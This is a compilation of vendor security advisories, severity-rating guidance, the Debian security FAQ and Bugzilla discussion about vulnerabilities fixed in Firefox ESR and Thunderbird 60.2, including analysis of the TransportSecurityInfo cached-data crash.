# Mozilla Foundation Security Advisory 2018-25

## Security vulnerabilities fixed in Thunderbird 60.2.1

Announced
October 4, 2018
Impact
critical
Products
Thunderbird
Fixed in

* Thunderbird 60.2.1

*In general, these flaws cannot be exploited through email in the Thunderbird product because scripting is disabled when reading mail, but are potentially risks in browser or browser-like contexts.*

#### [#CVE-2018-12377: Use-after-free in refresh driver timers](#CVE-2018-12377)

Reporter
Nils
Impact
high
##### Description

A use-after-free vulnerability can occur when refresh driver timers are refreshed in some circumstances during shutdown when the timer is deleted while still in use. This results in a potentially exploitable crash.

##### References

* [Bug 1470260](https://bugzilla.mozilla.org/show_bug.cgi?id=1470260)

#### [#CVE-2018-12378: Use-after-free in IndexedDB](#CVE-2018-12378)

Reporter
Zhanjia Song
Impact
high
##### Description

A use-after-free vulnerability can occur when an IndexedDB index is deleted while still in use by JavaScript code that is providing payload values to be stored. This results in a potentially exploitable crash.

##### References

* [Bug 1459383](https://bugzilla.mozilla.org/show_bug.cgi?id=1459383)

#### [#CVE-2018-18499: Same-origin policy violation using meta refresh and performance.getEntries to steal cross-origin URLs](#CVE-2018-18499)

Reporter
James Lee (@Windowsrcer) of Kryptos Logic
Impact
high
##### Description

A same-origin policy violation allowing the theft of cross-origin URL entries when using a `<meta> meta http-equiv="refresh"` on a page to cause a redirection to another site using `performance.getEntries()`. This is a same-origin policy violation and could allow for data theft.

##### References

* [Bug 1468523](https://bugzilla.mozilla.org/show_bug.cgi?id=1468523)

#### [#CVE-2018-12379: Out-of-bounds write with malicious MAR file](#CVE-2018-12379)

Reporter
Holger Fuhrmannek
Impact
moderate
##### Description

When the Mozilla Updater opens a MAR format file which contains a very long item filename, an out-of-bounds write can be triggered, leading to a potentially exploitable crash. This requires running the Mozilla Updater manually on the local system with the malicious MAR file in order to occur.

##### References

* [Bug 1473113](https://bugzilla.mozilla.org/show_bug.cgi?id=1473113)

#### [#CVE-2017-16541: Proxy bypass using automount and autofs](#CVE-2017-16541)

Reporter
Filippo Cavallarin
Impact
moderate
##### Description

Browser proxy settings can be bypassed by using the automount feature with autofs to create a mount point on the local file system. Content can be loaded from this mounted file system directly using a `file:` URI, bypassing configured proxy settings.
*Note: this issue only affects OS X in default configurations. On Linux systems, autofs must be installed for the vulnerability to occur and Windows is not affected.*

* [Bug 1412081](https://bugzilla.mozilla.org/show_bug.cgi?id=1412081)

#### [#CVE-2018-12385: Crash in TransportSecurityInfo due to cached data](#CVE-2018-12385)

Reporter
Philipp
Impact
moderate
##### Description

A potentially exploitable crash in `TransportSecurityInfo` used for SSL can be triggered by data stored in the local cache in the user profile directory. This issue is only exploitable in combination with another vulnerability allowing an attacker to write data into the local cache or from locally installed malware. This issue also triggers a non-exploitable startup crash for users switching between the Nightly and Release versions of Firefox if the same profile is used.

##### References

* [Bug 1490585](https://bugzilla.mozilla.org/show_bug.cgi?id=1490585)

#### [#CVE-2018-12383: Setting a master password post-Firefox 58 does not delete unencrypted previously stored passwords](#CVE-2018-12383)

Reporter
Jurgen Gaeremyn
Impact
low
##### Description

If a user saved passwords before Firefox 58 and then later set a master password, an unencrypted copy of these passwords is still accessible. This is because the older stored password file was not deleted when the data was copied to a new format starting in Firefox 58. The new master password is added only on the new file. This could allow the exposure of stored password data outside of user expectations.

#### [#CVE-2018-12376: Memory safety bugs fixed in Firefox 62, Firefox ESR 60.2, and Thunderbird 60.2.1](#CVE-2018-12376)

Reporter
Mozilla developers and community
Impact
critical
##### Description

Mozilla developers and community members Alex Gaynor, Boris Zbarsky, Christoph Diehl, Christian Holler, Jason Kratzer, Jed Davis, Tyson Smith, Bogdan Tara, Karl Tomlinson, Mats Palmgren, Nika Layzell, Ted Campbell, and Andrei Cristian Petcu reported memory safety bugs present in Firefox 61 and Firefox ESR 60.1. Some of these bugs showed evidence of memory corruption and we presume that with enough effort that some of these could be exploited to run arbitrary code.

# Mozilla Firefox: Multiple vulnerabilities — GLSA **201810-01**

Multiple vulnerabilities have been found in Mozilla Firefox, the
worst of which may allow execution of arbitrary code.

### Affected packages

| Package | **www-client/firefox** on all architectures |
| --- | --- |
| Affected versions | < **60.2.2** |
| Unaffected versions | >= **60.2.2** |

| Package | **www-client/firefox-bin** on all architectures |
| --- | --- |
| Affected versions | < **60.2.2** |
| Unaffected versions | >= **60.2.2** |

### Background

Mozilla Firefox is a popular open-source web browser from the Mozilla
Project.

### Description

Multiple vulnerabilities have been discovered in Mozilla Firefox. Please
review the referenced CVE identifiers for details.

### Impact

A remote attacker could entice a user to view a specially crafted web
page, possibly resulting in the execution of arbitrary code with the
privileges of the process or a Denial of Service condition. Furthermore,
a remote attacker may be able to perform Man-in-the-Middle attacks,
obtain sensitive information, spoof the address bar, conduct clickjacking
attacks, bypass security restrictions and protection mechanisms, or have
other unspecified impact.

### Workaround

There is no known workaround at this time.

### Resolution

All Mozilla Firefox users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-client/firefox-60.2.2"

```

All Mozilla Firefox binary users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=www-client/firefox-bin-60.2.2"

```

# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users’ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program’s source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat’s CVE database.

When a technology—enabled and most likely used by default—completely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

## Security vulnerabilities fixed in Firefox ESR 60.2.1

Announced
September 21, 2018
Impact

Products
Firefox ESR
Fixed in

* Firefox ESR 60.2.1

#### [#CVE-2018-12385: Crash in TransportSecurityInfo due to cached data](#CVE-2018-12385)

Reporter
Philipp
Impact
moderate
##### Description

A potentially exploitable crash in `TransportSecurityInfo` used for SSL can be triggered by data stored in the local cache in the user profile directory. This issue is only exploitable in combination with another vulnerability allowing an attacker to write data into the local cache or from locally installed malware. This issue also triggers a non-exploitable startup crash for users switching between the Nightly and Release versions of Firefox if the same profile is used.

#### [#CVE-2018-12383: Setting a master password post-Firefox 58 does not delete unencrypted previously stored passwords](#CVE-2018-12383)

Reporter
Jurgen Gaeremyn
Impact
low
##### Description

If a user saved passwords before Firefox 58 and then later set a master password, an unencrypted copy of these passwords is still accessible. This is because the older stored password file was not deleted when the data was copied to a new format starting in Firefox 58. The new master password is added only on the new file. This could allow the exposure of stored password data outside of user expectations.

*Q: I received a DSA via debian-security-announce, how can I upgrade the vulnerable packages?*

A: As the DSA mail says, you should upgrade the packages affected by the
announced vulnerability. You can do this by just upgrading (after
updating the list of available packages with apt-get update)
every package in your system with apt-get upgrade or by
upgrading just a particular package, with apt-get install
*package*.

The announcement mail mentions the source package in which the vulnerability
was present. Therefore, you should update all the binary packages from
that source package. To check the binary packages to update, visit
https://packages.debian.org/src:*source-package-name* and
click on *[show ... binary packages]* for the distribution you
are updating.

It may also be necessary to restart a service or a running process. The
command [checkrestart](https://manpages.debian.org/checkrestart)
included in the package
[debian-goodies](https://packages.debian.org/debian-goodies)
might help to find which ones.

*Q: The signature on your advisories does not verify correctly!*

A: This is most likely a problem on your end. The
[debian-security-announce](https://lists.debian.org/debian-security-announce/)
list has a filter that only allows messages with a correct signature
from one of the security team members to be posted.

Most likely some piece of mail software on your end slightly changes
the message that breaks the signature. Make sure your software does
not do any MIME encoding or decoding, or tab/space conversions.

Known culprits are fetchmail (with the mimedecode option enabled),
formail (from procmail 3.14 only) and evolution.

*Q: How is security handled in Debian?*

A: Once the security team receives a notification of an incident,
one or more members review it and consider its impact on the stable
release of Debian (i.e. if it's vulnerable or not).
If our system is vulnerable, we work on a fix for the
problem. The package maintainer is contacted as well, if they didn't
contact the security team already. Finally, the fix is tested and
new packages are prepared, which are then compiled on all stable
architectures and uploaded afterwards. After all of that is done,
an advisory is published.

*Q: Why are you fiddling with an old version of that package?*

The most important guideline when making a new package that fixes a
security problem is to make as few changes as possible. Our users and
developers are relying on the exact behaviour of a release once it is made,
so any change we make can possibly break someone's system. This is
especially true in case of libraries: make sure you never change the
Application Program Interface (API) or Application Binary Interface (ABI),
no matter how small the change is.

This means that moving to a new upstream version is not a good solution,
instead the relevant changes should be backported. Generally upstream
maintainers are willing to help if needed, if not the Debian security team
might be able to help.

In some cases it is not possible to backport a security fix, for example
when large amounts of source code need to be modified or rewritten. If that
happens it might be necessary to move to a new upstream version, but this
has to be coordinated with the security team beforehand.

*Q: The version number for a package indicates that I am still running
a vulnerable version!*

A: Instead of upgrading to a new release we backport security fixes to
the version that was shipped in the stable release. The reason we do
this is to make sure that a release changes as little as possible
so things will not change or break unexpectedly as a result of a
security fix. You can check if you are running a secure version of
a package by looking at the package changelog, or comparing its
exact version number with the version indicated in the Debian
Security Advisory.

*Q: I received an advisory, but the build for one
processor architecture seems to be missing.*

A: Generally the Security Team releases an advisory with builds of the updated
packages for all architectures that Debian supports. However, some architectures
are slower than others and it may happen that builds for most architectures
are ready while some are still missing. These smaller archs represent a small
fraction of our user base. Depending on the urgency of the issue
we may decide to release the advisory forthwith. The missing builds will be
installed as soon as they come available, but no further notice of this will
be given. Of course we will never release an advisory where the i386 or amd64
builds are not present.

*Q: How is security handled for unstable?*

A: Security for unstable is primarily handled by package maintainers, not
by the Debian Security Team. Although the security team may upload
high-urgency security-only fixes when maintainers are noticed to be
inactive, support for stable will always have priority.
If you want to have a secure (and stable) server you are strongly encouraged
to stay with stable.

*Q: How is security handled for testing?*

A: Security for testing benefits from the security efforts of the entire
project for unstable. However, there is a minimum two-day migration delay,
and sometimes security fixes can be held up by transitions. The Security
Team helps to move along those transitions holding back important
security uploads, but this is not always possible and delays may occur.
Especially in the months after a new stable release, when many new versions
are uploaded to unstable, security fixes for testing may lag behind.
If you want to have a secure (and stable) server you are strongly
encouraged to stay with stable.

*Q: How is security handled for contrib,
non-free and non-free-firmware?*

A: The short answer is: it's not. Contrib, non-free and non-free-firmware aren't official
parts of the Debian Distribution and are not released, and thus not
supported by the security team. Some non-free packages are distributed
without source or without a license allowing the distribution of modified
versions. In those cases no security fixes can be made at all. If it
is possible to fix the problem, and the package maintainer or someone else
provides correct updated packages, then the security team will generally
process them and release an advisory.

*Q: The advisory says unstable is fixed in
version 1.2.3-1, but unstable has 1.2.5-1, what's up?*

A: We try to list the first version in unstable that fixed the problem.
Sometimes the maintainer has uploaded even newer versions in the meantime.
Compare the version in unstable with the version we indicate. If it's the
same or higher, you should be safe from this vulnerability. If you want to
be sure, you can check the package changelog with apt-get changelog
package-name and search for the entry announcing the fix.

*Q: Why are there no official mirrors for security.debian.org?*

A: Actually, there are. There are several official mirrors, implemented
through DNS aliases. The purpose of security.debian.org is to make security
updates available as quickly and easily as possible.

Encouraging the use of unofficial mirrors would add extra complexity
that is usually not needed and that can cause frustration if these
mirrors are not kept up to date.

*Q: I've seen DSA 100 and DSA 102, now where is DSA 101?*

A: Several vendors (mostly of GNU/Linux, but also of BSD
derivatives) coordinate security advisories for some incidents and
agree to a particular timeline so that all vendors are able to
release an advisory at the same time. This was decided in order to
not discriminate some vendors that need more time (e.g. when the
vendor has to pass packages through lengthy QA tests or has to
support several architectures or binary distributions). Our own
security team also prepares advisories in advance. Every now and
then, other security issues have to be dealt with before the parked
advisory could be released, and hence temporarily leaving out one or
more advisories by number.

*Q: How can I reach the security team?*

A: Security information can be sent to security@debian.org or
team@security.debian.org, both of which are read by the members of
the security team.

If desired, email can be encrypted with the Debian Security
Contact key (key ID [0x0D59D2B15144766A14D241C66BAF400B05C3E651](https://keyserver.ubuntu.com/pks/lookup?op=get&search=0x0d59d2b15144766a14d241c66baf400b05c3e651)). For the OpenPGP keys of individual team members, please
refer to the [keyring.debian.org](https://keyring.debian.org/)
keyserver.

*Q: I guess I found a security problem, what should I do?*

A: If you learn about a security problem, either in one of your own
packages or in someone else's please always contact the security team. If
the Debian security team confirms the vulnerability and other vendors are
likely to be vulnerable as well, they usually contact other vendors as
well. If the vulnerability is not yet public they will try to coordinate
security advisories with the other vendors, so all major distributions are
in sync.

If the vulnerability is already publicly known, be sure to file a bug
report in the Debian BTS, and tag it security.

If you are a Debian maintainer, [see below](#care).

*Q: What am I supposed to do with a security problem in one of
my packages?*

A: If you learn of a security problem, either in your package or
someone else's please always contact the security team via email at
team@security.debian.org. They keep track
of outstanding security problems, can help maintainers with
security problems or fix problems on their own, are responsible for
sending out security advisories and maintaining
security.debian.org.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

It's particularly important that you don't upload to any other
distribution other than unstable without prior agreement by the
security team, because bypassing them will cause confusion and more
work.

*Q: I tried to download a package listed in one of the security
advisories, but I got a `file not found' error.*

A: Whenever a newer bugfix supersedes an older package on
security.debian.org, chances are high that the old package will be
removed by the time the new one gets installed. Hence, you'll get
this `file not found' error. We don't want to distribute packages
with known security bugs longer than absolutely necessary.

Please use the packages from the latest security advisories, which are
distributed through the [debian-security-announce](https://lists.debian.org/debian-security-announce/) mailing list. It's best to simply run
`apt-get update` before upgrading the package.

*Q: I've got a bugfix, can I upload to security.debian.org directly?*

A: No, you can't. The archive at security.debian.org is maintained
by the security team, who have to approve all packages. You should
instead send patches or proper source packages to the security team
via team@security.debian.org. They will be
reviewed by the security team and eventually uploaded, either with
or without modifications.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I've got a bugfix, can I upload to proposed-updates instead?*

A: Technically speaking, you can. However, you should not do this,
since this interferes badly with the work of the security team.
Packages from security.debian.org will be copied into the
proposed-updates directory automatically. If a package with the
same or a higher version number is already installed into the
archive, the security update will be rejected by the archive
system. That way, the stable distribution will end up without a
security update for this package instead, unless the wrong
packages in the proposed-updates directory were rejected. Please contact the
security team instead and include all details of the vulnerability
and attach the source files (i.e. diff.gz and dsc files) to your mail.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I'm pretty sure my packages are fine,
how can I upload them?*

A: If you are very sure that your packages don't break anything, that the
version is sane (i.e. greater than the version in stable and less than the
version in testing/unstable), that you didn't change the behaviour of the
package, despite the corresponding security problem, that you compiled it
for the correct distribution (that is `oldstable-security` or
`stable-security`), that the package contains the original
source if the package is new on security.debian.org, that you can confirm
the patch against the most recent version is clean and only touches the
corresponding security problem (check with `interdiff -z` and
both `.diff.gz` files), that you have proofread the patch at
least thrice, and that `debdiff` doesn't display any changes,
you may upload the files into the incoming directory
`ftp://ftp.security.upload.debian.org/pub/SecurityUploadQueue` on the
security.debian.org directly. Please send a notification with all details
and links to team@security.debian.org as well.

*Q: How can I help with security?*

A: Please review each problem before reporting it to
security@debian.org. If you are able to provide patches, that
would speed up the process. Do not simply forward bugtraq mails,
because we already receive them — but do provide us with
additional information about things reported on bugtraq.

A good way to get started with security work is helping
out on the Debian Security Tracker ([instructions](https://security-tracker.debian.org/tracker/data/report)).

*Q: What is the scope of proposed-updates?*

A: This directory contains packages which are proposed to enter the
next revision of Debian stable. Whenever packages are uploaded by
a maintainer for the stable distribution, they end up in the
proposed-updates directory. Since stable is meant to be stable, no
automatic updates are made. The security team will upload fixed
packages mentioned in their advisories to stable, however they will
be placed in proposed-updates first. Every couple of months the
Stable Release Manager checks the list of packages in
proposed-updates and discusses whether a package is suited for
stable or not. This is compiled into another revision of stable
(e.g. 2.2r3 or 2.2r4). Packages that don't fit will probably be
rejected and dropped from proposed-updates as well.

Note that the packages uploaded by maintainers (not by the security team)
in the proposed-updates/ directory are not supported by the security
team.

*Q: How is the security team composed?*

A: The Debian security team consists of
[several officers and secretaries](../intro/organization#security).
The security team itself appoints people to join the team.

*Q: How long will security updates be provided?*

A: The security team will support a stable distribution for
three years after its release. It is not possible to support three
distributions; supporting two simultaneously is already difficult
enough.

*Q: How can I check the integrity of packages?*

A: This process involve checking the Release file signature against
the [public key](https://ftp-master.debian.org/keys.html) used for the archive. The Release file contains the
checksums of Packages and Sources files, which contain
checksums of binary and source packages. Detailed instruction on how
to check packages integrity can be found in the [Debian Securing Manual](../doc/manuals/securing-debian-howto/ch7#s-deb-pack-sign).

*Q: What to do if a random package breaks after a security update?*

A: First of all, you should figure out why the package breaks and
how it is connected to the security update, then contact the
security team if it is serious or the stable release manager if it
is less serious. We're talking about random packages that break
after a security update of a different package. If you can't
figure out what's going wrong but have a correction, talk to the
security team as well. You may be redirected to the stable release
manager though.

*Q: What is a CVE identifier?*

A: The Common Vulnerabilities and Exposures project assignes
unique names, called CVE identifiers, to specific security
vulnerabilities, to make it easier to uniquely refer to a specific
issue. More information can be found at [Wikipedia](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures).

*Q: Does Debian issue a DSA for every CVE id?*

A: The Debian security team keeps track of every issued CVE identifier,
connect it to the relevant Debian package and assess its impact in a
Debian context - the fact that something is assigned a CVE id does not
necessarily imply that the issue is a serious threat to a Debian system.
This information is tracked in the
[Debian Security Tracker](https://security-tracker.debian.org)
and for the issues that are considered serious a Debian Security Advisory
will be issued.

Low-impact issues not qualifying for a DSA can be fixed in the next
release of Debian, in a point release of the current stable or oldstable
distributions, or are included in a DSA when that is being issued for a
more serious vulnerability.

*Q: Can Debian assign CVE identifiers?*

A: Debian is a CVE Numbering Authority and can assign ids, but per
CVE policy only to yet-undisclosed issues. If you have an undisclosed
security vulnerability for software in Debian and would like to get an
identifier for it, contact the Debian Security Team. For cases where the
vulnerability is already public, we advise to follow the procedure
detailed in the [CVE OpenSource Request HOWTO](https://github.com/RedHatProductSecurity/CVE-HOWTO).

*Q: Does Debian have a vulnerability disclosure policy?*

A: Debian has published a [vulnerability
disclosure policy](disclosure-policy) as part of its participation in the CVE
program.

*Q: Our vulnerability management tool
has shown that the following issues are open (list of CVEs with random CVSS
scores). When are those going to be fixed?*

A: Debian does not provide CVSS scores and doesn't use CVSS scores from
external sources when triaging security issues.

You can check the state of every single CVE ID in the Debian Security Tracker by accessing
it by [ID](https://security-tracker.debian.org/tracker/CVE-ID).

The "Notes" section will contain additional information, e.g. that a security issue doesn't
warrant a Debian security update, but might get fixed in a subsequent point release.

A list of packages for which a Security update is planned can be found at the
[dsa-needed list](https://salsa.debian.org/security-tracker-team/security-tracker/raw/master/data/dsa-needed.txt).

If you find an error in triage data, you're very welcome to report it. The Debian Security Team will
however not generally react to requests asking for more specific information, you should instead contact
the vendor of your vulnerability management tool, after all they are the ones who alerted you about a
security issue and not Debian.

# Deprecated Debian security FAQ

*Q: What does local (remote) mean?*

**The field *Problem type* in DSA mails is not used since April 2014.**

A: Some advisories cover vulnerabilities that cannot be identified
with the classic scheme of local and remote exploitability. Some
vulnerabilities cannot be exploited from remote, i.e. don't
correspond to a daemon listening to a network port. If they can be
exploited by special files that could be provided via the network
while the vulnerable service is not permanently connected with the
network, we write local (remote) in such cases.

Such vulnerabilities are somewhat between local and remote
vulnerabilities and often cover archives that could be provided
through the network, e.g. as mail attachment or from a download
page.

the relation timing-wise to the windows patch day might be a red herring.
over in [bug 1490653](/show_bug.cgi?id=1490653 "RESOLVED DUPLICATE - Firefox crashes on startup via mozilla::net::CacheEntry::GetSecurityInfo using any profile visited by Firefox Nightly (64)") and some other places affected people are saying the issue occurred after they moved with their profile last touched in a recent nightly to prior releases or even older nightly builds.

Yeah, we changed the serialization in [bug 1468222](/show_bug.cgi?id=1468222 "RESOLVED FIXED - Consolidate nsISSLStatus into nsITransportSecurityInfo"). In theory earlier versions should just return a failing nsresult. I'm looking in to why this results in crashes instead.Flags: needinfo?(dkeeler)

I think the problem is that this (in TransportSecurityInfo::Read) is not at all safe:
296 nsCOMPtr<nsISupports> supports;
297 rv = NS\_ReadOptionalObject(stream, true, getter\_AddRefs(supports));
298 if (NS\_FAILED(rv)) {
299 return rv;
300 }
301 mSSLStatus = BitwiseCast<nsSSLStatus\*, nsISupports\*>(supports.get());
( starts at <https://hg.mozilla.org/releases/mozilla-release/annotate/b54db6622358/security/manager/ssl/TransportSecurityInfo.cpp#l296> )
This reads something that is an nsISupports, but we have no idea what it is beyond that. Safe code would do\_QueryInterface to nsISSLStatus (and if that results in a null pointer, it's not an nsISSLStatus), but this code wants the underlying implementation (nsSSLStatus) rather than the interface, so it just grabs the raw pointer. This appears to have ultimately been introduced in [bug 262116](/show_bug.cgi?id=262116 "RESOLVED FIXED - mixed http/https warnings after enabling browser.cache.disk_cache_ssl") (in 2007).
(The reason this crashes is that when the TransportSecurityInfo is destructed, nsSSLStatus::~nsSSLStatus is called on mSSLStatus, which isn't actually an nsSSLStatus, and things start to go even more awry from there.)
While in theory this can result in arbitrary code execution, luckily the only inputs to this function \*should\* come from the user's profile directory (i.e. the cache/session restore/etc.) or privileged Firefox internals, so I don't think this is a remote code execution vulnerability. I'm rating this a sec-high based on that, but feel free to re-assess.
Ironically, [bug 1468222](/show_bug.cgi?id=1468222 "RESOLVED FIXED - Consolidate nsISSLStatus into nsITransportSecurityInfo") fixed this in Nightly by removing this code.Assignee: nobody → dkeelerBlocks: [262116](/show_bug.cgi?id=262116 "RESOLVED FIXED - mixed http/https warnings after enabling browser.cache.disk_cache_ssl")

[Security approval request comment]
How easily could an exploit be constructed based on the patch?
Like J.C. said, it's pretty clear what's going on here. That said, I believe this would require another vulnerability to exploit. Something that gave an attacker write access to the cache directory in the user's profile would be enough, for example.
Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?
Yes, but then again, so does the patch itself.
Which older supported branches are affected by this flaw?
All of them.
If not all supported branches, which bug introduced the flaw?
n/a, but [bug 262116](/show_bug.cgi?id=262116 "RESOLVED FIXED - mixed http/https warnings after enabling browser.cache.disk_cache_ssl")
Do you have backports for the affected branches? If not, how different, hard to create, and risky will they be?
This applies to all affected branches.
How likely is this patch to cause regressions; how much testing does it need?
This should be strictly more correct than before, so it's unlikely to cause new regressions. Also, it does have an automated test, so we should be good there.

